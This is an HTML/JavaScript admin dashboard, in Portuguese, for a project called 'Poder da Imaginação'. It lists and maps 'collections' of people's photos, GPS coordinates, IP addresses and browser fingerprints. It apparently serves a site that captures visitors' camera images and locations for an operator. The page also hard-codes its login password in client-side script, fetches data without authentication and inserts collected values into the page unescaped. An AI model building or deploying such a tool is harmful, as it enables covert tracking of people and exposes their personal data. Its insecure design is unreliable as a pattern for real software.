<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin • Poder da Imaginação</title>
    
    <!-- Leaflet para o mapa -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0a0f;
            color: #f0ece4;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }

        /* ===== LOGIN ===== */
        .login-overlay {
            position: fixed; inset: 0;
            background: rgba(0,0,0,0.9);
            backdrop-filter: blur(20px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .login-overlay.hidden { display: none; }
        .login-box {
            background: #14141e;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 40px;
            max-width: 380px;
            width: 100%;
        }
        .login-box h2 { font-size: 24px; margin-bottom: 8px; color: #c9b084; }
        .login-box p { color: #a8a0b8; font-size: 14px; margin-bottom: 24px; }
        .login-box input {
            width: 100%; padding: 12px 16px;
            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px; color: #f0ece4; font-size: 14px; margin-bottom: 16px;
        }
        .login-box input:focus { outline: none; border-color: #c9b084; }
        .login-box button {
            width: 100%; padding: 12px;
            background: #c9b084; border: none;
            border-radius: 8px; color: #0a0a0f;
            font-size: 14px; font-weight: 600; cursor: pointer;
        }
        .login-box button:hover { background: #d4c0a0; }
        .login-box .error-msg { color: #f87171; font-size: 12px; margin-top: 12px; display: none; }
        .login-box .error-msg.visible { display: block; }

        /* ===== HEADER ===== */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px 0; border-bottom: 1px solid rgba(255,255,255,0.06);
            margin-bottom: 24px; flex-wrap: wrap; gap: 12px;
        }
        .header .logo { font-size: 20px; color: #c9b084; font-weight: 300; }
        .header .logo span { color: #f0ece4; }
        .header .badge {
            font-size: 12px; color: #6a6a82;
            background: #1a1a2e; padding: 4px 12px; border-radius: 20px;
        }
        .header .logout {
            background: none; border: 1px solid rgba(255,255,255,0.06);
            padding: 6px 16px; border-radius: 20px;
            color: #a8a0b8; cursor: pointer; font-size: 12px;
        }
        .header .logout:hover { background: #1a1a2e; }

        /* ===== STATS ===== */
        .stats {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px; margin-bottom: 24px;
        }
        .stat-card {
            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px; padding: 16px; text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover { border-color: rgba(201,176,132,0.2); }
        .stat-card .number { font-size: 24px; font-weight: 600; color: #f0ece4; }
        .stat-card .label { font-size: 11px; color: #6a6a82; margin-top: 4px; text-transform: uppercase; }

        /* ===== MAPA ===== */
        .map-container {
            background: #1a1a2e;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
        }
        .map-container .map-title {
            font-size: 14px; color: #a8a0b8; margin-bottom: 12px;
        }
        #map {
            height: 300px;
            border-radius: 8px;
            background: #0a0a0f;
        }

        /* ===== LISTA DE COLETAS ===== */
        .section-title {
            font-size: 14px; color: #a8a0b8; margin-bottom: 12px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .coleta-item {
            background: #1a1a2e; border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px; padding: 16px; margin-bottom: 12px;
            transition: all 0.3s ease;
        }
        .coleta-item:hover { border-color: rgba(201,176,132,0.15); }

        .coleta-item .row-top {
            display: flex; justify-content: space-between; align-items: center;
            flex-wrap: wrap; gap: 8px;
            margin-bottom: 8px;
        }
        .coleta-item .id { font-size: 11px; color: #6a6a82; font-family: monospace; }
        .coleta-item .timestamp { font-size: 12px; color: #6a6a82; }
        .coleta-item .badge-foto {
            font-size: 10px; padding: 2px 10px; border-radius: 10px;
            background: rgba(74,222,128,0.1); color: #4ade80;
            border: 1px solid rgba(74,222,128,0.15);
        }
        .coleta-item .badge-no-foto {
            font-size: 10px; padding: 2px 10px; border-radius: 10px;
            background: rgba(248,113,113,0.1); color: #f87171;
            border: 1px solid rgba(248,113,113,0.15);
        }
        .coleta-item .badge-local {
            font-size: 10px; padding: 2px 10px; border-radius: 10px;
            background: rgba(96,165,250,0.1); color: #60a5fa;
            border: 1px solid rgba(96,165,250,0.15);
        }
        .coleta-item .toggle {
            background: none; border: none; color: #6a6a82;
            cursor: pointer; font-size: 11px; padding: 4px 8px;
        }
        .coleta-item .toggle:hover { color: #a8a0b8; }

        /* ===== DETALHES ===== */
        .coleta-item .details {
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.06);
            display: none;
            gap: 16px;
            grid-template-columns: 1fr 1fr;
        }
        .coleta-item .details.visible { display: grid; }

        .coleta-item .details .info-grid {
            display: flex; flex-direction: column; gap: 4px;
        }
        .coleta-item .details .info-row {
            display: flex; justify-content: space-between;
            padding: 4px 0; font-size: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }
        .coleta-item .details .info-row .label { color: #6a6a82; }
        .coleta-item .details .info-row .value { color: #a8a0b8; max-width: 60%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

        .coleta-item .details .foto-container {
            grid-column: 1 / -1;
            text-align: center;
            background: #0a0a0f;
            border-radius: 8px;
            padding: 12px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .coleta-item .details .foto-container img {
            max-width: 100%;
            max-height: 400px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.06);
        }
        .coleta-item .details .foto-container .no-foto-msg {
            color: #6a6a82; font-size: 13px; padding: 20px;
        }

        .coleta-item .details .map-mini {
            grid-column: 1 / -1;
            height: 200px;
            border-radius: 8px;
            background: #0a0a0f;
            border: 1px solid rgba(255,255,255,0.04);
        }

        .loading-state, .empty-state {
            text-align: center; padding: 40px 0; color: #6a6a82; font-size: 14px;
        }
        .empty-state .icon { font-size: 32px; margin-bottom: 12px; opacity: 0.5; }

        /* ===== RESPONSIVO ===== */
        @media (max-width: 700px) {
            .coleta-item .details { grid-template-columns: 1fr; }
            .coleta-item .row-top { flex-direction: column; align-items: flex-start; }
            .stats { grid-template-columns: 1fr 1fr; }
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: #0a0a0f; }
        ::-webkit-scrollbar-thumb { background: #1a1a2e; border-radius: 4px; }
    </style>
</head>
<body>

    <!-- ===== LOGIN ===== -->
    <div class="login-overlay" id="loginOverlay">
        <div class="login-box">
            <h2>✦ Acesso Restrito</h2>
            <p>Digite a senha para acessar o painel.</p>
            <input type="password" id="senhaInput" placeholder="Senha..." autofocus>
            <button id="loginBtn">Entrar</button>
            <div class="error-msg" id="loginError">Senha incorreta. Tente novamente.</div>
        </div>
    </div>

    <!-- ===== CONTEÚDO ===== -->
    <div class="container" id="mainContent" style="display:none;">

        <!-- HEADER -->
        <div class="header">
            <div class="logo">✦ Poder da <span>Imaginação</span></div>
            <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
                <span class="badge" id="totalColetas">0 coletas</span>
                <button class="logout" id="logoutBtn">Sair</button>
            </div>
        </div>

        <!-- STATS -->
        <div class="stats">
            <div class="stat-card"><div class="number" id="statTotal">0</div><div class="label">Total</div></div>
            <div class="stat-card"><div class="number" id="statComFoto">0</div><div class="label">Com Foto</div></div>
            <div class="stat-card"><div class="number" id="statComLocal">0</div><div class="label">Com Local</div></div>
            <div class="stat-card"><div class="number" id="statHoje">0</div><div class="label">Hoje</div></div>
        </div>

        <!-- MAPA GERAL -->
        <div class="map-container">
            <div class="map-title">📍 Todas as Localizações</div>
            <div id="map"></div>
        </div>

        <!-- LISTA -->
        <div class="section-title">
            📋 Histórico de Coletas
            <span class="badge" id="countLabel">carregando...</span>
        </div>
        <div class="coletas-list" id="coletasList">
            <div class="loading-state">⏳ Carregando dados...</div>
        </div>
    </div>

    <script>
        (function() {
            const SENHA_ADMIN = 'imaginacao2026';

            const loginOverlay = document.getElementById('loginOverlay');
            const senhaInput = document.getElementById('senhaInput');
            const loginBtn = document.getElementById('loginBtn');
            const loginError = document.getElementById('loginError');
            const mainContent = document.getElementById('mainContent');
            const logoutBtn = document.getElementById('logoutBtn');
            const coletasList = document.getElementById('coletasList');
            const totalColetas = document.getElementById('totalColetas');
            const statTotal = document.getElementById('statTotal');
            const statComFoto = document.getElementById('statComFoto');
            const statComLocal = document.getElementById('statComLocal');
            const statHoje = document.getElementById('statHoje');
            const countLabel = document.getElementById('countLabel');

            let map = null;
            let markers = [];

            // ===== MAPA =====
            function initMap(localizacoes) {
                if (map) {
                    map.remove();
                    markers.forEach(m => map.removeLayer(m));
                    markers = [];
                }

                map = L.map('map').setView([-14.2350, -51.9253], 4);

                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);

                // Adiciona marcadores
                localizacoes.forEach((loc, index) => {
                    if (loc && loc.latitude && loc.longitude) {
                        const marker = L.marker([loc.latitude, loc.longitude])
                            .addTo(map)
                            .bindPopup(`<b>Coleta #${index + 1}</b><br>Lat: ${loc.latitude.toFixed(6)}<br>Lon: ${loc.longitude.toFixed(6)}`);
                        markers.push(marker);
                    }
                });

                // Ajusta o zoom para mostrar todos os marcadores
                if (markers.length > 0) {
                    const group = L.featureGroup(markers);
                    map.fitBounds(group.getBounds(), { padding: [50, 50] });
                }
            }

            // ===== LOGIN =====
            function fazerLogin() {
                if (senhaInput.value === SENHA_ADMIN) {
                    loginOverlay.classList.add('hidden');
                    mainContent.style.display = 'block';
                    loginError.classList.remove('visible');
                    carregarDados();
                } else {
                    loginError.classList.add('visible');
                    senhaInput.value = '';
                    senhaInput.focus();
                }
            }

            function fazerLogout() {
                mainContent.style.display = 'none';
                loginOverlay.classList.remove('hidden');
                senhaInput.value = '';
                loginError.classList.remove('visible');
                senhaInput.focus();
            }

            // ===== CARREGAR DADOS =====
            async function carregarDados() {
                coletasList.innerHTML = '<div class="loading-state">⏳ Carregando dados...</div>';

                try {
                    const response = await fetch('/api/admin');
                    if (!response.ok) throw new Error('HTTP ' + response.status);
                    const data = await response.json();

                    if (!data.arquivos || data.arquivos.length === 0) {
                        coletasList.innerHTML = `
                            <div class="empty-state">
                                <div class="icon">🌿</div>
                                <div>Nenhuma coleta registrada ainda.</div>
                                <div style="font-size:12px;margin-top:4px;">Acesse o site principal para começar.</div>
                            </div>
                        `;
                        countLabel.textContent = '0 coletas';
                        atualizarStats([]);
                        initMap([]);
                        return;
                    }

                    renderizarColetas(data.arquivos);
                    atualizarStats(data.arquivos);
                    
                    // Prepara localizações para o mapa
                    const localizacoes = data.arquivos
                        .map(item => item.conteudo?.localizacao)
                        .filter(loc => loc && loc.latitude && loc.longitude);
                    initMap(localizacoes);

                } catch (error) {
                    console.error('❌ Erro:', error);
                    coletasList.innerHTML = `
                        <div class="empty-state">
                            <div class="icon">⚠️</div>
                            <div>Erro ao carregar dados.</div>
                            <div style="font-size:12px;margin-top:4px;">${error.message}</div>
                        </div>
                    `;
                }
            }

            // ===== RENDERIZAR COLETAS =====
            function renderizarColetas(arquivos) {
                countLabel.textContent = arquivos.length + ' coletas';

                let html = '';
                arquivos.forEach((item, index) => {
                    const dados = item.conteudo || {};
                    const local = dados.localizacao || {};
                    const navegador = dados.navegador || {};
                    const temFoto = !!dados.foto;
                    const temLocal = !!(local.latitude && local.longitude);

                    html += `
                        <div class="coleta-item" data-index="${index}">
                            <div class="row-top">
                                <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
                                    <span class="id">#${dados.id ? dados.id.substring(0,8) : '—'}</span>
                                    <span class="timestamp">${formatarData(dados.timestamp)}</span>
                                    ${temFoto ? '<span class="badge-foto">📸 Foto</span>' : '<span class="badge-no-foto">📸 Sem foto</span>'}
                                    ${temLocal ? '<span class="badge-local">📍 GPS</span>' : ''}
                                </div>
                                <button class="toggle" data-index="${index}">▾ Detalhes</button>
                            </div>
                            <div class="details" id="details-${index}">
                                <!-- INFO -->
                                <div class="info-grid">
                                    <div class="info-row"><span class="label">ID</span><span class="value">${dados.id || '—'}</span></div>
                                    <div class="info-row"><span class="label">Data/Hora</span><span class="value">${formatarDataCompleta(dados.timestamp)}</span></div>
                                    ${local.latitude ? `<div class="info-row"><span class="label">Latitude</span><span class="value">${local.latitude}</span></div>` : ''}
                                    ${local.longitude ? `<div class="info-row"><span class="label">Longitude</span><span class="value">${local.longitude}</span></div>` : ''}
                                    ${local.precisao ? `<div class="info-row"><span class="label">Precisão</span><span class="value">${local.precisao}m</span></div>` : ''}
                                    <div class="info-row"><span class="label">IP</span><span class="value">${dados.ip || '—'}</span></div>
                                </div>
                                <div class="info-grid">
                                    <div class="info-row"><span class="label">Navegador</span><span class="value">${navegador.userAgent ? navegador.userAgent.substring(0,50) + '...' : '—'}</span></div>
                                    <div class="info-row"><span class="label">Timezone</span><span class="value">${navegador.timezone || '—'}</span></div>
                                    <div class="info-row"><span class="label">Idioma</span><span class="value">${navegador.language || '—'}</span></div>
                                    <div class="info-row"><span class="label">Tela</span><span class="value">${navegador.screenWidth ? navegador.screenWidth + 'x' + navegador.screenHeight : '—'}</span></div>
                                    <div class="info-row"><span class="label">Plataforma</span><span class="value">${navegador.platform || '—'}</span></div>
                                    <div class="info-row"><span class="label">Pixel Ratio</span><span class="value">${navegador.pixelRatio || '—'}</span></div>
                                </div>
                                ${temLocal ? `
                                <div class="map-mini" id="miniMap-${index}"></div>
                                ` : ''}
                                <div class="foto-container">
                                    ${temFoto ? `
                                        <img src="${dados.foto}" alt="Foto capturada" />
                                    ` : `
                                        <div class="no-foto-msg">📸 Nenhuma foto capturada</div>
                                    `}
                                </div>
                            </div>
                        </div>
                    `;
                });

                coletasList.innerHTML = html;

                // Toggle details
                document.querySelectorAll('.toggle').forEach(btn => {
                    btn.addEventListener('click', function() {
                        const idx = this.dataset.index;
                        const details = document.getElementById('details-' + idx);
                        details.classList.toggle('visible');
                        this.textContent = details.classList.contains('visible') ? '▴ Ocultar' : '▾ Detalhes';

                        // Inicializa mini mapa se tiver localização
                        if (details.classList.contains('visible')) {
                            const item = arquivos[parseInt(idx)];
                            const local = item.conteudo?.localizacao;
                            if (local && local.latitude && local.longitude) {
                                setTimeout(() => {
                                    const miniMap = document.getElementById('miniMap-' + idx);
                                    if (miniMap && !miniMap._leaflet) {
                                        const m = L.map(miniMap).setView([local.latitude, local.longitude], 13);
                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                                            attribution: '© OpenStreetMap'
                                        }).addTo(m);
                                        L.marker([local.latitude, local.longitude]).addTo(m);
                                        miniMap._leaflet = true;
                                    }
                                }, 200);
                            }
                        }
                    });
                });
            }

            // ===== ATUALIZAR STATS =====
            function atualizarStats(arquivos) {
                const total = arquivos.length;
                let comFoto = 0, comLocal = 0, hoje = 0;
                const hojeStr = new Date().toISOString().split('T')[0];

                arquivos.forEach(item => {
                    const dados = item.conteudo || {};
                    if (dados.foto) comFoto++;
                    if (dados.localizacao && dados.localizacao.latitude) comLocal++;
                    if (dados.timestamp && dados.timestamp.startsWith(hojeStr)) hoje++;
                });

                statTotal.textContent = total;
                statComFoto.textContent = comFoto;
                statComLocal.textContent = comLocal;
                statHoje.textContent = hoje;
                totalColetas.textContent = total + ' coletas';
            }

            // ===== FORMATADORES =====
            function formatarData(timestamp) {
                if (!timestamp) return '—';
                const d = new Date(timestamp);
                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
            }

            function formatarDataCompleta(timestamp) {
                if (!timestamp) return '—';
                const d = new Date(timestamp);
                return d.toLocaleDateString('pt-BR', { day: '2-digit', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
            }

            // ===== EVENTOS =====
            loginBtn.addEventListener('click', fazerLogin);
            senhaInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') fazerLogin(); });
            logoutBtn.addEventListener('click', fazerLogout);

            setTimeout(() => senhaInput.focus(), 300);
            setInterval(carregarDados, 30000);

        })();
    </script>
</body>
</html>
